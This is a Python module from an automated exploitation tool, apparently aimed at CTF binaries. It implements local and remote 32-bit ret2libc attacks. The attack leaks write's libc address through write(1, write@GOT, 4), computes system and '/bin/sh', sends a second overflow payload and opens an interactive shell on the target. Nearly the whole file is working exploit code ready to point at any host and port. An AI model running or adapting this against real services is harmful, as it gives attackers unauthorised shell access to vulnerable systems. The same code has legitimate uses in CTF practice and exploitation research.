"""P7.5: x32 ret2libc-write strategies (local + remote).

Replaces the v3.1 monolith's ``ret2libc_write_x32`` (L1514-1588, local)
+ ``ret2libc_write_x32_remote`` (L1026-1080, remote) ad-hoc 2-stage
functions with two :class:`ExploitStrategy` subclasses.

The 2-stage flow (vs P7.4 puts-leak)
------------------------------------
P7.4's ret2libc_put uses ``puts(puts@GOT)`` to leak a libc
address — works for binaries that import ``puts``.  When
``puts`` is missing from PLT (e.g. some hand-rolled CTF
challenges), we fall back to ``write(fd=1, write@GOT, n)``
which reads exactly ``n`` bytes raw from the GOT.  The
2-stage flow is otherwise identical:

  1. **Stage 1 (leak)**: send ``padding + write_plt + main +
     1 + write_got + 4`` (x32).  The binary's ``main()``
     calls ``write(1, write@GOT, 4)`` which prints 4 raw
     bytes containing the runtime address of libc's ``write``.
     Return to ``main()`` for stage 2.
  2. **Parse leak**: ``u32(io.recv(4))`` (x32 size-known read).
  3. **Stage 2 (return-to-system)**: send ``padding + system +
     0 + sh``.  Primitive calculates ``system`` + ``/bin/sh``
     from the leak.
  4. **Shell**: ``io.interactive()``.

Per ``rebuild.md`` §6.8 P7.5 + ``refactor.md`` §3.2.2 + P6.4
primitive contract.

Why this is a separate strategy from P7.4
------------------------------------------
* ``requires = ("has_write",)`` — different PLT gate than puts.
  Some binaries have only one of the two; ``candidates`` picks
  the right one based on what's in ctx.
* Same priority chain (RET2LIBC_WRITE = 110 per 附录 A),
  below puts (120).  PUT preferred over WRITE per
  P7.2a Owner decision (PUT PLT more universal in glibc).
"""
from __future__ import annotations

import datetime

from autopwn.context import ExploitContext
from autopwn.core.logging import (
    print_info,
    print_payload,
    print_section_header,
    print_success,
)
from autopwn.exp.base import ExploitStrategy
from autopwn.exp.priorities import RET2LIBC_WRITE
from autopwn.exp.registry import register
from autopwn.primitives.ret2libc_write import Ret2LibcWriteX32
from autopwn.report.model import ExploitInfo


# ---------------------------------------------------------------------------
# Local x32 strategy
# ---------------------------------------------------------------------------


@register
class Ret2LibcWriteX32LocalStrategy(ExploitStrategy):
    """Local 32-bit 2-stage ret2libc via ``write(1, write@GOT, 4)`` leak.

    Metadata (``requires_*``):
      * ``arch = 32``
      * ``remote = False``
      * ``requires = ("has_write",)`` — needs ``write`` in PLT
        (populated by P4.3 ``plt.scan``).  The x32 PUT-strategy
        (P7.4) needs ``has_puts``; this strategy kicks in only
        when ``has_write`` is True AND ``has_puts`` is False
        (otherwise P7.4 wins on priority 120 vs 110).

    Priority ``RET2LIBC_WRITE = 110`` per 附录 A.  Below
    ret2libc_put (120); tried when puts is absent.

    Returns:
        ``True`` on successful shell, ``False`` on leak parse
        failure or primitive empty (skip to next candidate).
    """

    name = "ret2libc-write-x32"
    priority = RET2LIBC_WRITE
    requires_arch = 32
    requires_remote = False
    requires = ("has_write",)

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 32-bit 2-stage ret2libc locally."""
        from pwn import process, u32

        print_section_header("EXPLOITATION: ret2libc (write) - x32")
        print_payload("preparing ret2libc exploit using write function")

        primitive = Ret2LibcWriteX32()

        # Stage 1: leak.
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("ret2libc-write-x32 stage1 primitive returned empty; skipping")
            return False

        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(payload1)
        print_payload("stage 1: leaking write address from GOT")

        try:
            write_addr = u32(io.recv(4))
        except Exception as e:
            print_info(f"ret2libc-write-x32 leak parse failed: {e}")
            return False
        print_success(f"write address leaked: {hex(write_addr)}")

        # Stage 2: return-to-system.
        payload2 = primitive.build_stage2_payload(ctx, write_addr)
        if not payload2:
            print_info("ret2libc-write-x32 stage2 primitive returned empty; skipping")
            return False

        io.sendline(payload2)
        print_payload("stage 2: executing system('/bin/sh')")

        info = ExploitInfo(
            exploit_type="ret2libc (write) - x32",
            payload=payload2,
            padding=ctx.padding,
            addresses={
                "write_addr": write_addr,
            },
            vulnerability_type="Stack Buffer Overflow",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )

        from autopwn.report import record_success
        record_success(info)

        io.interactive()
        return True


# ---------------------------------------------------------------------------
# Remote x32 strategy
# ---------------------------------------------------------------------------


@register
class Ret2LibcWriteX32RemoteStrategy(ExploitStrategy):
    """Remote 32-bit 2-stage ret2libc via ``write(1, write@GOT, 4)`` leak.

    Mirror of :class:`Ret2LibcWriteX32LocalStrategy` for the
    ``ctx.mode == "remote"`` branch.  Same payload flow;
    ``pwn.remote(host, port)`` instead of ``pwn.process(path)``.
    """

    name = "ret2libc-write-x32-remote"
    priority = RET2LIBC_WRITE
    requires_arch = 32
    requires_remote = True
    requires = ("has_write",)

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 32-bit 2-stage ret2libc against a remote service."""
        from pwn import remote, u32

        if ctx.remote is None:
            print_info("ret2libc-write-x32-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        print_section_header("EXPLOITATION: ret2libc (write) - x32 Remote")
        print_payload("preparing remote ret2libc exploit using write function")

        primitive = Ret2LibcWriteX32()

        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("ret2libc-write-x32-remote stage1 primitive returned empty; skipping")
            return False

        io = remote(host, port)
        io.recv()
        io.sendline(payload1)
        print_payload("stage 1: leaking write address from GOT")

        try:
            write_addr = u32(io.recv(4))
        except Exception as e:
            print_info(f"ret2libc-write-x32-remote leak parse failed: {e}")
            return False
        print_success(f"write address leaked: {hex(write_addr)}")

        payload2 = primitive.build_stage2_payload(ctx, write_addr)
        if not payload2:
            return False

        io.sendline(payload2)
        print_payload("stage 2: executing system('/bin/sh')")

        info = ExploitInfo(
            exploit_type="ret2libc (write) - x32 Remote",
            payload=payload2,
            padding=ctx.padding,
            addresses={
                "write_addr": write_addr,
            },
            vulnerability_type="Stack Buffer Overflow",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )

        from autopwn.report import record_success
        record_success(info)

        io.interactive()
        return True


__all__ = [
    "Ret2LibcWriteX32LocalStrategy",
    "Ret2LibcWriteX32RemoteStrategy",
]
